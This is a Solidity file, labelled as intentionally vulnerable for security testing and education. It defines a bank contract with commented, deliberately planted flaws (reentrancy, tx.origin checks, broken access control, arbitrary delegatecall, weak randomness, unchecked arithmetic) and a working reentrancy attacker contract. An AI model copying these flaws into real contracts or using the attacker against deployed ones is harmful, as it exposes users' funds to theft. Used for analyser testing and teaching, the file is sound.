// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

// WARNING: This contract is intentionally vulnerable.
// It is only meant for security testing and education.
// Never deploy it with real funds.

contract VulnerableBankShort {
    address public owner;
    address public admin;
    address public feeCollector;
    address public libraryAddress;

    mapping(address => uint256) public balances;
    address[] public users;

    uint256 public lotteryPool;
    uint256 public lastDepositTime;
    bool public paused;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event WinnerPaid(address indexed winner, uint256 amount);

    constructor(address _feeCollector, address _libraryAddress) {
        owner = msg.sender;
        admin = msg.sender;
        feeCollector = _feeCollector;
        libraryAddress = _libraryAddress;
    }

    // Vulnerability: tx.origin used for authorization.
    // Slither: tx-origin.
    modifier onlyOwnerTxOrigin() {
        require(tx.origin == owner, "not owner");
        _;
    }

    // Vulnerability: broken access control.
    // This does not check msg.sender, so any user can pass while admin is non-zero.
    modifier onlyAdminBroken() {
        require(admin != address(0), "admin not set");
        _;
    }

    function deposit() external payable {
        require(!paused, "paused");
        require(msg.value > 0, "zero deposit");

        if (balances[msg.sender] == 0) {
            users.push(msg.sender);
        }

        balances[msg.sender] += msg.value;
        lotteryPool += msg.value / 100;
        lastDepositTime = block.timestamp; // Timestamp dependence.

        emit Deposited(msg.sender, msg.value);
    }

    // Vulnerability: reentrancy.
    // Ether is sent before the user's balance is updated.
    // Slither: reentrancy-eth.
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient balance");

        uint256 fee = amount / 100;
        uint256 payout = amount - fee;

        (bool ok, ) = msg.sender.call{value: payout}("");
        require(ok, "transfer failed");

        balances[msg.sender] -= amount;

        // Vulnerability: unchecked low-level call return value.
        // Slither: unchecked-send.
        payable(feeCollector).send(fee);

        emit Withdrawn(msg.sender, amount);
    }

    // Vulnerability: anyone can pause or unpause the contract.
    // Slither may report missing access control as a design issue.
    function setPaused(bool _paused) external {
        paused = _paused;
    }

    // Vulnerability: weak randomness.
    // Uses predictable/manipulable block values to select a winner.
    // Slither: weak-prng / timestamp.
    function pickLotteryWinner() external {
        require(users.length > 0, "no users");
        require(lotteryPool > 0, "empty pool");

        uint256 randomIndex = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.difficulty,
                    msg.sender
                )
            )
        ) % users.length;

        address winner = users[randomIndex];
        uint256 prize = lotteryPool;
        lotteryPool = 0;

        (bool ok, ) = winner.call{value: prize}("");
        require(ok, "prize transfer failed");

        emit WinnerPaid(winner, prize);
    }

    // Vulnerability: arbitrary delegatecall to a configurable address.
    // The external code runs in this contract's storage context.
    // Slither: controlled-delegatecall / delegatecall-loop depending on analysis.
    function executeLogic(bytes calldata data) external onlyAdminBroken {
        (bool success, ) = libraryAddress.delegatecall(data);
        require(success, "delegatecall failed");
    }

    // Vulnerability: library address can be changed because onlyAdminBroken is flawed.
    function setLibraryAddress(address newLibraryAddress) external onlyAdminBroken {
        libraryAddress = newLibraryAddress;
    }

    // Vulnerability: unprotected emergency withdrawal through broken access control.
    function emergencyWithdraw() external onlyAdminBroken {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Vulnerability: tx.origin-based selfdestruct authorization.
    // Slither: suicidal / tx-origin.
    function destroy(address payable receiver) external onlyOwnerTxOrigin {
        selfdestruct(receiver);
    }

    // Vulnerability: unchecked arithmetic in Solidity 0.7.x.
    // Slither: arithmetic warnings may appear depending on configuration.
    function unsafeSubtract(uint256 amount) external {
        balances[msg.sender] -= amount;
    }

    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

// Simple attacker contract for testing the reentrancy issue.
contract ReentrancyAttackerShort {
    VulnerableBankShort public target;
    uint256 public attackAmount;

    constructor(address payable _target) {
        target = VulnerableBankShort(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "send ETH");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}
